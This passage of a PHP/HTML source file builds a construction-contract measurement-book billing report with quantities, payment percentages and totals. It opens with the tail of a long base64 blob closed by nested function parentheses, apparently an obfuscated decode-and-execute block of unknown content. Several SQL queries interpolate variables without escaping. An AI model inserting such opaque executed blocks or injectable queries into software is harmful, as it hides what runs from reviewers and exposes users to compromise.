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')))));
	if($Line >= 30)
	{
	?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $LineTemp; ?></td>
	</tr>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
	</table>
	<p style='page-break-after:always;'></p>
	<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
		<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
	</table>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
	<?php echo $tablehead; ?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $LineIncr."*".$Linecheck; ?></td>
	</tr>
	<?php
	$Line = $LineIncr+$Linecheck; $page++;
	}
	//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
	?>
	<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
	<tr border='1' bgcolor="" class="labelprint">
		<!--<td  align='center' width='' class='labelsmall' style=" border-top-color:#666666; border-bottom-color:#0A9CC5; background-color:#0A9CC5" id="td_popupbutton<?php echo $table_group_row; ?>">
			<input type="checkbox" name="check" id="ch_item<?php //echo $table_group_row; ?>" value="<?php //echo $checkbox_str; ?>"  />
		</td>-->
		<td width="61px" align="center" style="border-top-color:#666666;" class="">
			<?php echo $subdivname;?>
		</td>
		<td colspan="8" style="border-top-color:#666666;" class="">
			<?php echo $description; ?>
		</td>
		<td style="border-top-color:#666666;" width="40px"><?php //echo $slm_cnt."**".$dpm_cnt; ?>&nbsp;</td>
		<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
		<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
	</tr>
	<?php 
	$rowcount++; $Line++;//echo "A = ".$Line."<br/>";
	// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page);  $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>"; }
	
	if(in_array($subdivisionlist[$i],$DevItemArray))
	{
		//$slm_measurement_qty = 0;
		//$slm_cnt = 0;
		$DpmAmount_1 = $dpm_measurement_qty * $rate;
		?>
		<tr border='1' bgcolor="#DF00FE" class="labelprint">
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='left' width='' class='' style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
				<td  align='right' width='' class=''><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='right' width='' class=''>&nbsp;</td>
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='right' width='' class=''><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
				<td  align='right' width='' class=''><?php 
								echo number_format($DpmAmount_1, 2, '.', '');
								$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
								?></td>
				<td  align='right' width='' class=''></td>
				<td  align='right' width='' class=''></td>
				<td  align='center' width='' class='' style="font-size:9px;"></td>
			</tr>
			<?php
			$Line++;
	}
	else
	{
	
	
	
	
	
	//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
		$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
		$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
		$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
		$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;
	
		if($dpm_cnt > 0)
		{
			$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
			//echo "D = ".count($eplodedpm)."<br/>";
			 $DpmTemp = 0;
			for($x4=0; $x4<count($eplodedpm); $x4+=13)
			{
				$dpmqty 				= $eplodedpm[$x4+1];
				//echo $dpmqty."<br/>";
				$remarks 				= $eplodedpm[$x4+10];
				$rbnDpm					= $eplodedpm[$x4+11];
				$MeasurementbookidDpm	= $eplodedpm[$x4+12];
				$paymentpercent_dpm 	= $eplodedpm[$x4+7];
				$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
				$dummy=0;
				if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
				{
					$ArrUniqueVal 	= array_unique($DpmArrMbidList);
					$UniqueCount 	= count($ArrUniqueVal);
					$x6=0;
					$count_1 		= count($DpmArrAmbList);
					$count_2 		= count($DpmArrAmbPgList);
					$AMBookNo 		= $DpmArrAmbList[$count_1-1];
					$AMBookPage 	= $DpmArrAmbList[$count_2-1];
					while($x6<=$UniqueCount)
					{
						$StartKey = $ArrUniqueVal[$x6];
						$PaidDpmPerc = $DpmArrPercent[$StartKey];
						$rowspancnt = $UniqueCount+$DpmTemp;
						$DpmKeyresult = checkPartpayment($DpmArrMbidList,$StartKey);
						$DpmPercSum = $PaidDpmPerc;
						if($DpmKeyresult != "")
						{
							$explodeDpmKeyresult = explode("*",$DpmKeyresult);
							for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
							{
								$key = $explodeDpmKeyresult[$x7];
								$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
							}
							if(($x6 == 0)&&($DpmTemp == 0))
							{
							$DpmQuantityty_1 = $DpmArrQuantityList[$key];
							$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
								if(in_array($StartKey, $SlmArrMbidList))
								{
									$Arrkey = array_search($StartKey, $SlmArrMbidList);
									$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
									$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
									$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
								}
							$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
							
	?>
						<tr border='1' bgcolor="#FFFFFF" class="labelprint">
							<td  align='center' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='left' width='180px' class='' rowspan="<?php echo $rowspancnt; ?>" style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
							<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
							<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"></td>
							<td  align='right' width='' class=''><?php echo $QtyDpmSlm_1; ?></td>
							<td  align='right' width='' class=''>
								<?php 
								echo number_format($DpmAmount_1, 2, '.', '');
								$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
								?>
							</td>
							<td  align='right' width='6%' class='' rowspan=""></td>
							<td  align='right' width='3%' class='' rowspan="">
								<?php
								if(in_array($StartKey, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
								} 
								?>
							</td>
							<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
								<?php 
								if(in_array($StartKey, $SlmArrMbidList))
								{
									echo $total_percent_dpm_slm_1."% Paid"; 
								}
								?>
							</td>
						</tr>
	
	<?php					$rowcount++;	
							}
							
							else
							{
								if(in_array($StartKey, $SlmArrMbidList))
								{
									$Arrkey = array_search($StartKey, $SlmArrMbidList);
									$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
									$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
									$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
									$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
									
								}
								else
								{
									$QtyDpm_5 = $DpmArrQuantityList[$key];
									$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
								}
	?>
								<tr border='1' bgcolor="#FFFFFF" class="labelprint">
									<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
									<td  align='right' width='' class=''><?php echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); $dpm_amount_item = $dpm_amount_item + $Dpm_Slm_Amount_2; ?></td>
									<td  align='right' width='' class=''></td>
									<td  align='right' width='' class=''>
										<?php
										if(in_array($StartKey, $SlmArrMbidList))
										{
											echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
											$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
										} 
										?>
									</td>
									<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
										<?php 
										if(in_array($StartKey, $SlmArrMbidList))
										{
											echo $total_percent_dpm_slm_2."% Paid"; 
										}
										?>
									</td>
								</tr>
			<?php				$rowcount++;		
							}
							
						}
						$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
						$x6++;	
						array_push($temp_array,$StartKey);
					}
					//$Line = $Line + $rowspancnt;//echo "B = ".$rowspancnt."<br/>";
					// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>";}
				}
								//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
				$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;		
				if(in_array($MeasurementbookidDpm, $temp_array))
				{
					$dummy = 1;
				}
				else
				{
					if($x4 == 0)
					{ 
						if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
						{
							$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
							$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
							$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
							$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
						}
						$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
	?>
						<tr border='1' bgcolor="#FFFFFF" class="labelprint">
							<!--<td  align='left' width='3%' class=''>&nbsp;</td>-->
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
							<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='right' width='' class=''>
								<?php 
									echo number_format($dpmqty, $decimal, '.', ''); 
									
								?>
							</td>
							<td  align='right' width='' class=''>
								<?php 
									echo number_format($dpmamt, 2, '.', ''); 
									$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
								?>
							</td>
							<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
							<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
								<?php 
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
								}
								?>
							</td>
							<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
								<?php 
									echo $total_percent_dpm_slm_3."% Paid"; 
								?>
							</td>
						</tr>	
	<?php 			$rowcount++;
					}
					if(($dpm_cnt > 1) && ($x4 != 0))
					{
						if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
						{
							$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
							$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
							$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
							$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
						}
						$total_percent_dpm_slm_4 = $paymentpercent_dpm + $PercDpmSlm_4;
	?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
						<td  align='right' width='' class=''><?php echo number_format($dpmamt, 2, '.', ''); $dpm_amount_item  = $dpm_amount_item + $dpmamt; ?></td>
						<?php 
						if($dummy == 0) 
						{
						?>
							<td  align='right' width='' class=''></td>
							<td  align='right' width='' class=''>
								<?php 
									if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
									}
								 ?>
							</td>
							<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
								<?php
									//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
									//{
										echo $total_percent_dpm_slm_4."% Paid";
									//}
								?>
							</td>
						<?php 
						} 
						?>
					</tr>
	<?php	
					$rowcount++;
					}
				}
				//$Line = $Line + $dpm_cnt;//echo "C = ".$dpm_cnt."<br/>";
				// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
				$DpmTemp++; 
			}
			//$rowcount++;
		}
		
		
	}	
		
		
		
		
		
		
		
		
	//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
	?>
	<?php
	
	
	
		$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
		$mbooktype_query = "select flag from mbookgenerate WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
		$mbooktype_sql = mysql_query($mbooktype_query);
		if(mysql_num_rows($mbooktype_sql)>0)
		{
			$flagtype = @mysql_result($mbooktype_sql,0,'flag');
			if($flagtype == 1) { $mbookdescription = "/MBook No. "; }
			if($flagtype == 2) { $mbookdescription = "/MBook No. "; }
		}
		else
		{
			$mbooktype_query1 = "select flag from measurementbook WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
			$mbooktype_sql1 = mysql_query($mbooktype_query1);
			$flagtype = @mysql_result($mbooktype_sql1,0,'flag');
			if($flagtype == 1) { $mbookdescription = "/MBook No. "; }
			if($flagtype == 2) { $mbookdescription = "/MBook No. "; }
		}
	
		if($slm_cnt > 0)
		{
			$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
			//echo "B = ".count($eplodeslm)."<br/>";
			for($x3=0; $x3<count($eplodeslm); $x3+=12)
			{
				$slmqty = $eplodeslm[$x3+1];
				
				$remarks = $eplodeslm[$x3+10];
				$paymentpercent = $eplodeslm[$x3+7];
				$slmamt = $slmqty * $rate * $paymentpercent / 100;
				$slm_amount_item = $slm_amount_item + $slmamt;
				if($x3 == 0)
				{
	?>
			<tr border='1' bgcolor="#FFFFFF" class="labelprint">
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide P ".$mbpageno_slm.$mbookdescription.$mbookno_slm; ?></td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class=''>
					<?php 
						echo number_format($slmqty, $decimal, '.', ''); 
					?>
				</td>
				<td  align='right' width='' class=''>
					<?php 
						echo number_format($slmamt, 2, '.', ''); 
					?>
				</td>
				<td  align='center' width='' class='' style="font-size:9px;">
					<?php 
					if($paymentpercent<100)
					{
						echo $paymentpercent."% Paid";
					} 
					?>
				</td>
			</tr>
	<?php
				}
				if(($slm_cnt > 1) && ($x3 != 0))
				{
				
	?>
			<tr border='1' bgcolor="#FFFFFF" class="labelprint">
				<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
				<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
				<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
			</tr>
	<?php
				$rowcount++;
				}
			}
		$rowcount++; //$Line = $Line + $slm_cnt;//echo "C = ".$slm_cnt."<br/>";
		 //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
		}
		if($PartPayremarks != "")
		{
	?>
			<tr border='1' class="labelprint" style="font-size:10px;">
				<td colspan="12" align="left" bgcolor="">Remarks &nbsp; :&nbsp;&nbsp;&nbsp;  <?php echo $PartPayremarks; ?></td>
			</tr>
	<?php	
			$rowcount++; $Line++;//echo "E = ".$Line."<br/>";
			// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
		}	
	//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
	$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
	$total_amt_item = $slm_amount_item + $dpm_amount_item;
	
		if(in_array($subdivisionlist[$i],$DevItemArray))
		{
			//testing
		}
		else
		{
			$dev_qty_exceed = 0; 
			$CheckDevRes = CheckDeviatedQtyItem($abstsheetid,$subdivid,$total_qty_item);
			if($CheckDevRes != "")
			{
				$DevQtyflag = "";
				$expCheckDevRes = explode("*",$CheckDevRes);
				$wo_qty_with_dev 	= $expCheckDevRes[0];
				$dev_qty_exceed 	= $expCheckDevRes[1];
				$DevQtyflag 		= $expCheckDevRes[2];
				if($DevQtyflag == 1)
				{
					array_push($DevItemArray,$subdivid);
					$WoQtyItemArr[$subdivid] = $wo_qty_with_dev;
					
					
					if($DevPartPayStr != "")
					{
						$deviated_amt_tot_temp = 0;
						$dev_qty_exceed_temp = $dev_qty_exceed;
						$DevPartPayStr 		= rtrim($DevPartPayStr,"@");
						$expDevPartPayStr 	= explode("@",$DevPartPayStr);
						for($s2=0; $s2<count($expDevPartPayStr); $s2++)
						{
							$DevPartPayStr2 	= $expDevPartPayStr[$s2];
							$expDevPartPayStr2 	= explode("*",$DevPartPayStr2);
							$Ded_Dev_itemid 	= $expDevPartPayStr2[0];
							$Ded_Dev_qty 		= $expDevPartPayStr2[1];
							$Ded_Dev_percent 	= $expDevPartPayStr2[2];
							if($dev_qty_exceed_temp>0)
							{
								$deviated_amt_temp = round(($Ded_Dev_qty*$rate*$Ded_Dev_percent/100),2);
								$dev_qty_exceed_temp = $dev_qty_exceed_temp - $Ded_Dev_qty;
								$deviated_amt_tot_temp = $deviated_amt_tot_temp + $deviated_amt_temp;
							}
							//else
							//{
								//$deviated_amt_temp = round(($Ded_Dev_qty*$rate),2);
								//$deviated_amt_tot_temp = $deviated_amt_tot_temp + $deviated_amt_temp;
							//}
						}
					}
					//$deviated_amt = round(($dev_qty_exceed*$rate),2);
					$deviated_amt = round(($deviated_amt_tot_temp),2);
					
		?>
				<tr border='1' class="labelprint" bgcolor="#B3E4FF">
					<td  align='right' width='' class='labelbold' colspan="2">Deduct Deviated Qty.<?php //echo $deviated_amt_tot_temp; ?></td>
					<td  align='right' width='' class=''>-<?php echo number_format($dev_qty_exceed, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php //echo $rate; ?></td>
					<td  align='left' width='' class=''><?php //echo $unit; ?></td>
					<td  align='right' width='' class=''><?php //echo number_format($deviated_amt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>-<?php echo number_format($dev_qty_exceed, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''>-<?php echo number_format($deviated_amt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
				</tr>
				<?php
					$Line++;
					$DedResDpmQty = $dpm_measurement_qty;
					$DedResDpmAmt = $dpm_amount_item;
					$DedResSlmQty = round(($slm_measurement_qty-$dev_qty_exceed),$decimal);
					$DedResSlmAmt = round(($slm_amount_item-$deviated_amt),2);
					$DedResSlmDpmQty = round(($total_qty_item-$dev_qty_exceed),$decimal);
					$DedResSlmDpmAmt = round(($DedResDpmAmt+$DedResSlmAmt),2);
				?>
				<!--<tr border='1' class="labelprint" bgcolor="#B3E4FF">
					<td  align='right' width='' class='labelbold' colspan="2">Deduct - Result</td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmDpmQty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo $rate; ?></td>
					<td  align='left' width='' class=''><?php echo $unit; ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmDpmAmt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''><?php echo number_format($DedResDpmQty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResDpmAmt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmQty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmAmt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
				</tr>-->
		<?php	
					$Line++;
					
					$total_qty_item = $DedResSlmDpmQty; $total_amt_item = $DedResSlmDpmAmt; $dpm_measurement_qty = $DedResDpmQty;
					$dpm_amount_item = $DedResDpmAmt; $slm_measurement_qty = $DedResSlmQty; $slm_amount_item = $DedResSlmAmt;
				}
			}
		}
			//$total_qty_item = round(($total_qty_item-$dev_qty_exceed),$decimal);
	?>
		<tr border='1' class="labelprint" bgcolor="">
			<!--<td  align='left' width='3%' class=' label' style="border-bottom-color:#666666">&nbsp;</td>-->
			<td  align='left' width='' class=''>&nbsp;<?php //echo $Line; ?></td>
			<td  align='right' width='' class='labelbold'>TOTAL</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo $rate; ?>
			</td>
			<td  align='left' width='' class=''>
			<?php echo $unit; ?>
			</td>
			<td  align='right' width='' class=''>
			<?php echo number_format($total_amt_item, 2, '.', ''); ?>
